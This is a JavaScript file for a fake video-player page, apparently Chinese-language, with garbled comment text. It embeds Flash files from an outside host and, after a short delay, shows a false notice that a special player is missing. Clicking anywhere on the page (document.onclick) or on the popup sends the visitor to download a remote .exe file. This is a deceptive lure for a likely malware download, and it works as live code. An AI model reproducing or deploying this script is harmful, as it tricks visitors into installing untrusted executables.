//��ǰurl
var NowUrl = window.location.href + "?xs_7_1000_xs";
var exe = NowUrl.split("xs")[1]

//Flash��ַ
var FlashUrl = "http://aifuli.github.io/blog/id=";
var FlashMdb = 'nHDLnHfknjTd|nHDvnHm4n1nL|nHDvnHm4nWfL|nHDvnHm3rjmv|nHDLnHfsnjT1';
var fff = FlashMdb.split("|")
var ffcc = parseInt(fff.length * Math.random())

//play
function play1(){
d_close();
dt_play();
setTimeout(gettime,5000);
document.getElementById("h0").innerHTML = document.getElementById("h2").innerHTML;
//document.getElementById("flash_play").innerHTML = '<embed class="swf_play" src="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf" width="640" height="480" loop="false"></embed>';
document.getElementById("flash_play").innerHTML = '<object class="swf_play" height="480" width="640" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="loop" value="0"><param value="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf" name="movie"><param value="high" name="quality"><param value="always" name="allowScriptAccess"><param value="internal" name="allowNetworking"><param value="transparent" name="wmode"><embed height="480" width="640" loop="0" wmode="transparent" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" allownetworking="internal" allowscriptaccess="always" quality="high" src="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf"></object>';
}
function play2(){
document.getElementById("h0").innerHTML = document.getElementById("h1").innerHTML
document.getElementById("flash_play").innerHTML = '';
}


//��ʾ����
var tit = document.getElementById("tit").innerHTML;
var ttt = tit.split("|")
var id = parseInt(ttt.length * Math.random())
var main = '<div class="play_right_2"><ul>';
for (i=0;i < ttt.length; i++) {var cc = parseInt(ttt.length*Math.random());main = main + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank">' + ttt[cc] + '</a></li>'}
var main = main + '</ul></div>';
//�ұ�����
document.getElementById("r_xx").innerHTML = main;
//����
document.getElementById("t_tit").innerHTML = ttt[id];
document.getElementById("d_tt").innerHTML = ttt[id];
function dt_play(){document.getElementById("p_xx").innerHTML = '���ڲ��ţ�' + ttt[id];}//��ҳ����
window.document.title = ttt[id] + ' - ľ����ҳ';
//���ص�ַ
function dload(){window.location = "http://guodou.gzydr.com/guodou_1157_1131.exe"}
var imgs = 'nHDvnWmLn1fk|nHDvrj0knj6L|nHDLnWn3nWm1|nHDvrj0sP1b4';
var img = imgs.split("|")
var mann = '<div class="bufer"><ul>';
for (i=0;i < imgs.length; i++) {var cc = parseInt(ttt.length*Math.random());var ci = parseInt(img.length*Math.random());mann = mann + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank"><img src="http://aifuli.github.io/blog/id=' + img[i] + '.jpg"><br>' + ttt[cc] + '</a></li>'}
var mann = mann + '<ul></div>';
//�ײ�
document.getElementById("bbt").innerHTML = mann;

//��ҳ�沥��


//�ر� ��ʾ
function d_close(){document.getElementById("c_cloce").innerHTML = '';}
function d_show(){document.getElementById("c_cloce").innerHTML = '<div id="f_down0"></div><div id="f_down5"><div class="cColes"><a href="javascript:d_close();">X</a></div></div><div class="f_down"><div class="f_down1"><div class="df1">�޷��������ţ���Ϊϵͳ��⵽��û�а�װ������ר�ò�������</div><div class="df2">��ʾ�����ء�����ר�ò���������װ��ɺ���ˢ����ҳ�������ţ�</div><div class="dd0"><div class="dd1"><a href="javascript:dload();"></a></div><div class="dd2"><a href="javascript:dload();"></a></div></div></div></div>';}
//5�����ʾ
function d_tid(){document.getElementById("p_xx").innerHTML = '��ʾ��ӰƬ���س�����Ϊ��⵽������δ��װ������ר�ò��������������ذ�װ��';}
function gettime(){
d_show();
d_tid();
document.getElementById("h0").innerHTML = document.getElementById("h1").innerHTML
}
//ִ�в���
play1();
//�������λ��
document.onclick=dload;
//��30����ʾ����
//setTimeout(ichat,2000);
//setTimeout(ichat,30000);
//������ʾ��
function ichat(){confirm("ϵͳ��⵽��û�а�װ����Ѽ��鲥�������������޷����ţ�������ȷ�������ذ�װ��ˢ����ҳ�����������š�");dload();}
//cnzz and 51.la
